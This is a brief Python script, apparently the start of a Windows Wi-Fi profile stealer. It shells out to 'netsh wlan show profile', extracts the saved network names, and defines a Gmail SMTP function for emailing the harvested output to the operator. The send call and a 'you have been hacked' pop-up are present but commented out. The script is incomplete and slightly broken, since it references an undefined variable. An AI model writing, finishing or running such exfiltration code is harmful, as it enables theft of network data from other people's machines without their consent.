import subprocess
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)    # setting up smtp server. Using google smtp server
    server.starttls()  # Initiating a tls connection
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)  # executes a command and shows its output
network_names = re.findall("(?:Profile\s*:\s)(.*)" , str(networks))  # using regex grouping to get the name of the network 
print(network_names)
#send_mail("Yourmail", "Password", result)

# command = "%SystemRoot%\Sysnative\msg.exe *you have been hacked!!"
# subprocess.Popen(command, shell=True)
